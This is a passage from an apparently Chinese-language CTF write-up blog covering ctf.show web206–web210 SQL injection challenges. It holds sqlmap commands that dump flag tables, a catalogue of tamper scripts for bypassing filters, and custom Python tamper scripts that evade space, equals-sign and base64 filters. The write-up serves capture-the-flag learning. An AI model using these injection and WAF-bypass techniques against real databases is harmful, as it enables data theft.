‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥</span><br><span class="line">--safe-freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,<span class="built_in">id</span>,tes --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><h3 id="â€“level-5"><a href="#â€“level-5" class="headerlink" title="â€“level=5"></a>â€“level=5</h3><p>æç¤ºè¯´sqléœ€è¦é—­åˆï¼Œ<br>æ‰“ä¸å‡ºæ¥å¯ä»¥ä½¿ç”¨æ›´é«˜çš„LEVELè°ƒç”¨æ›´å¤šçš„payloadã€‚<br>å…¶å®éƒ½ä¸ç”¨æé«˜ç­‰çº§ï¼Œsqlmapä½levelå°±å¯ä»¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h3 id="tamperçš„ç¼–å†™-å¸¸è§tamperè„šæœ¬"><a href="#tamperçš„ç¼–å†™-å¸¸è§tamperè„šæœ¬" class="headerlink" title="tamperçš„ç¼–å†™ å¸¸è§tamperè„šæœ¬"></a>tamperçš„ç¼–å†™ å¸¸è§tamperè„šæœ¬</h3><p>é¦–å…ˆçœ‹è¿‡æ»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨tamperè„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">ä¸¾ä¾‹å¦‚ä¸‹tamperè„šæœ¬ï¼š</span><br><span class="line"></span><br><span class="line">apostrophemask.py ç”¨utf8ä»£æ›¿å¼•å·</span><br><span class="line"></span><br><span class="line">equaltolike.py MSSQL * SQLiteä¸­like ä»£æ›¿ç­‰å·</span><br><span class="line"></span><br><span class="line">greatest.py MySQLä¸­ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·</span><br><span class="line"></span><br><span class="line">space2hash.py ç©ºæ ¼æ›¿æ¢ä¸º<span class="comment">#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦ </span></span><br><span class="line"></span><br><span class="line">space2comment.py ç”¨/**/ä»£æ›¿ç©ºæ ¼</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQLç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py å½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®º</span><br><span class="line"></span><br><span class="line">space2morehash.py MySQLä¸­ç©ºæ ¼æ›¿æ¢ä¸º <span class="comment">#å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦</span></span><br><span class="line"></span><br><span class="line">appendnullbyte.p Microsoft Accessåœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç </span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py MySQLï¼ŒSQLite (possibly)ï¼ŒSAP MaxDBç»•è¿‡å¯¹ IFNULL è¿‡æ»¤</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py mssqlç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·</span><br><span class="line"></span><br><span class="line">base64encode.py ç”¨<span class="built_in">base64</span>ç¼–ç </span><br><span class="line"></span><br><span class="line">space2mssqlhash.py mssqlæŸ¥è¯¢ä¸­æ›¿æ¢ç©ºæ ¼</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py mysqlä¸­è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Š</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py mysqlä¸­ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·</span><br><span class="line"></span><br><span class="line">between.py MS SQL 2005ï¼ŒMySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0ä¸­ç”¨betweenæ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰</span><br><span class="line"></span><br><span class="line">space2mysqldash.py MySQLï¼ŒMSSQLæ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰</span><br><span class="line"></span><br><span class="line">multiplespaces.py å›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼</span><br><span class="line"></span><br><span class="line">space2plus.py ç”¨+æ›¿æ¢ç©ºæ ¼</span><br><span class="line"></span><br><span class="line">bluecoat.py MySQL 5.1, SGOSä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥ã€‚ ç„¶åæ›¿æ¢=ä¸ºlike</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py åŒé‡æŸ¥è¯¢è¯­å¥ã€‚å–ä»£predefined SQLå…³é”®å­—withè¡¨ç¤º suitable <span class="keyword">for</span>æ›¿ä»£</span><br><span class="line"></span><br><span class="line">space2randomblank.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†</span><br><span class="line"></span><br><span class="line">sp_password.py è¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„26 æœ‰æ•ˆè½½è·çš„æœ«å°¾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py åŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)</span><br><span class="line"></span><br><span class="line">unionalltounion.py æ›¿æ¢UNION ALL SELECT UNION SELECT</span><br><span class="line"></span><br><span class="line">charencode.py Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0urlç¼–ç ï¼›</span><br><span class="line"></span><br><span class="line">randomcase.py Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0ä¸­éšæœºå¤§å°å†™</span><br><span class="line"></span><br><span class="line">unmagicquotes.py å®½å­—ç¬¦ç»•è¿‡ GPC addslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py ç”¨/**/åˆ†å‰²sqlå…³é”®å­—</span><br><span class="line"></span><br><span class="line">charunicodeencode.py ASPï¼ŒASP.NETä¸­å­—ç¬¦ä¸² unicode ç¼–ç </span><br><span class="line"></span><br><span class="line">securesphere.py è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py MySQL &gt;= 5.1.13æ³¨é‡Šç»•è¿‡</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; 5.1ä¸­å…³é”®å­—å‰åŠ æ³¨é‡Š</span><br><span class="line"></span><br><span class="line">space2comment.pyæ›¿æ¢ç©ºæ ¼å­—ç¬¦ä¸²(â€˜â€˜) ä½¿ç”¨æ³¨é‡Šâ€˜/**/â€™</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå°±å¯ä»¥ä½¿ç”¨space2comment.pyæ–‡ä»¶<br>payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•å†™è‡ªå·±çš„tamperè„šæœ¬"><a href="#å¦‚ä½•å†™è‡ªå·±çš„tamperè„šæœ¬" class="headerlink" title="å¦‚ä½•å†™è‡ªå·±çš„tamperè„šæœ¬"></a>å¦‚ä½•å†™è‡ªå·±çš„tamperè„šæœ¬</h2><p><a href="https://www.wlhhlc.top/posts/14827">https://www.wlhhlc.top/posts/14827</a> å‚è€ƒè¿™ä¸ªä½¬å­¦ä¼šçš„<br>æˆ‘ä»¬æ‰“å¼€space2comment.py ä¿®æ”¹ï¼ˆæ–‡ä»¶åœ¨<code>/usr/share/sqlmap/tamper</code>ä¸‹ï¼‰<br>æˆ‘ä»¬ç¼–è¾‘è„šæœ¬ï¼Œå¹¶å°†å…¶ä¸­çš„<code>/**/</code>ä¿®æ”¹ä¸º <code>%09</code>æ¥åšåˆ°ç»•è¿‡ç©ºæ ¼ã€‚<br>æ–°å»ºä¸€ä¸ªspace2comment2.py ç„¶åå°†ä¿®æ”¹åçš„è„šæœ¬ç²˜è´´è¿›å»ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> not firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += chr(0x9)</span><br><span class="line">                    <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">                quote = not quote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            elif payload[i] == &#x27;</span><span class="string">&quot;&#x27;:</span></span><br><span class="line"><span class="string">                doublequote = not doublequote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            elif payload[i] == &quot;</span> <span class="string">&quot; and not doublequote and not quote:</span></span><br><span class="line"><span class="string">                retVal += chr(0x9)</span></span><br><span class="line"><span class="string">                continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            retVal += payload[i]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return retVal</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171350412-cce3a4a4-a1d3-4275-9381-4b8988fe4572.png" alt="image.png"><br>ç„¶åå°±å¯ä»¥è¿è¡Œè‡ªå·±çš„tamperäº†ã€‚</p><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">// <span class="variable">$id</span> = str_replace(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†selectï¼Œä½†æ˜¯æ˜¯å°å†™ï¼Œsqlmapæ˜¯å¯ä»¥ç”¨å¤§å†™çš„ç»•è¿‡çš„ã€‚å› æ­¤è¿˜ç”¨ä¸Šé¢˜ç›®çš„è„šæœ¬å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment2 --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --d</span><br><span class="line">ump</span><br></pre></td></tr></table></figure><p>æ³¨æ„æˆ‘è¿™é‡Œä½¿ç”¨çš„ä¸Šé“é¢˜ç¼–å†™çš„<code>space2comment**2**</code>è€Œä¸æ˜¯<code>space2comment</code>å½“ç„¶ç”¨åè€…ä¹Ÿå¯ä»¥ã€‚</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>æœ‰æ—¶å€™å¯ä»¥ç›´æ¥æ— å·®åˆ«çˆ†ç ´ï¼Œæ¯”å¦‚çŸ¥é“åº“å°±ç›´æ¥è·³åˆ°dumpï¼Œsqlmapä¼šè‡ªå·±æŒ–å‡ºæ‰€æœ‰çš„ä¸²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment2 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171787437-65fd338d-a17a-4aa1-b36f-d7a463cb3675.png" alt="image.png"></p><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><h3 id="è‡ªå®šä¹‰tamper"><a href="#è‡ªå®šä¹‰tamper" class="headerlink" title="è‡ªå®šä¹‰tamper"></a>è‡ªå®šä¹‰tamper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line"> //TODO æœªå®Œå·¥</span><br><span class="line"> <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ç©ºæ ¼ * =<br>ç­‰å·å¯ä»¥ç”¨<code>like</code>ä»£æ›¿<br>ç®€ä¾¿ä¸€ä¸‹è„šæœ¬å¦‚å›¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>)</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>æˆ‘ä¿å­˜åœ¨äº†tamperç›®å½•ä¸‹çš„ctfshow209.pyæ–‡ä»¶<br>payloadè¿è¡Œå³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow209 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h2 id="By-the-way"><a href="#By-the-way" class="headerlink" title="By the way"></a>By the way</h2><p>åšäº†è¿™ä¹ˆå¤šï¼Œpayloadå…¶å®ä¸å¤ªå¥½æ¢ï¼Œæ¥ä¸ªæ­£åˆ™ç›´æ¥åœ¨emeditoré‡Œé¢ç›´æ¥æ›¿æ¢äº†ã€‚<br>æ­£åˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-<span class="number">9</span>\-\.]+/</span><br></pre></td></tr></table></figure><p>æ­£åˆ™æœ‰æœºä¼šä¸€å®šè¦å­¦ä¸€ä¸‹ã€‚</p><h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h3 id="è‡ªå®šä¹‰tamper-1"><a href="#è‡ªå®šä¹‰tamper-1" class="headerlink" title="è‡ªå®šä¹‰tamper"></a>è‡ªå®šä¹‰tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function decode($<span class="built_in">id</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="built_in">id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å®ƒçš„ä½œç”¨æ˜¯å¯¹ä¸€ä¸ªç»è¿‡ä¸¤æ¬¡base64ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç å’Œåè½¬æ“ä½œã€‚<br>å…·ä½“åˆ†æå¦‚ä¸‹ï¼š</p></li><li><p>base64_decode($id)ï¼šæ­¤éƒ¨åˆ†ä»£ç è¡¨ç¤ºå¯¹ä¸€ä¸ªå˜é‡ $id è¿›è¡Œbase64è§£ç æ“ä½œã€‚åœ¨Pythonä¸­ï¼Œå¯ä»¥ä½¿ç”¨ base64.b64decode() å‡½æ•°æ¥å®ç°ã€‚</p></li><li><p>strrev(base64_decode($id))ï¼šæ­¤éƒ¨åˆ†ä»£ç è¡¨ç¤ºå¯¹ä¸Šä¸€æ­¥ä¸­è§£ç åçš„ç»“æœè¿›è¡Œå­—ç¬¦ä¸²åè½¬æ“ä½œã€‚åœ¨Pythonä¸­ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²åˆ‡ç‰‡æ¥å®ç°ï¼Œå³å°†å­—ç¬¦ä¸²åå‘å–å€¼ï¼Œä¾‹å¦‚ string[::-1]ã€‚</p></li><li><p>base64_decode(strrev(base64_decode($id)))ï¼šæ­¤éƒ¨åˆ†ä»£ç è¡¨ç¤ºå¯¹å‰ä¸€æ­¥çš„åè½¬ç»“æœå†æ¬¡è¿›è¡Œbase64è§£ç ã€‚</p></li><li><p>strrev(base64_decode(strrev(base64_decode($id))))ï¼šæœ€åä¸€æ­¥å°†å‰ä¸€æ­¥è§£ç åçš„ç»“æœå†æ¬¡è¿›è¡Œå­—ç¬¦ä¸²åè½¬æ“ä½œï¼Œå¾—åˆ°æœ€ç»ˆçš„è§£ç ç»“æœã€‚</p></li></ol><p>æŠŠè§£å¯†è¿‡ç¨‹åè¿‡æ¥å³å¯ã€‚<br>æˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ç§è§£æ³•ç¬¬ä¸€ç§wpä¸­å†™æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">retVal = b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(retVal)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(retVal)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§å°±æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reversed_string1 = retVal[::-<span class="number">1</span>]</span><br><span class="line">encoded_string1 = base64.b64encode(reversed_string1.encode()).decode()</span><br><span class="line">reversed_string2 = encoded_string1[::-<span class="number">1</span>]</span><br><span class="line">encrypted_string = base64.b64encode(reversed_string2.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(encrypted_string)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç¬¬äºŒç§<code>[::-1]</code>æ˜¯Pythonä¸­å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼ˆsliceï¼‰çš„ä¸€ç§ç”¨æ³•ï¼Œå®ƒè¡¨ç¤ºå°†å­—ç¬¦ä¸²åå‘å–å€¼ã€‚<br>è„šæœ¬ä»¥ç¬¬ä¸€ç§ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> base64 <span 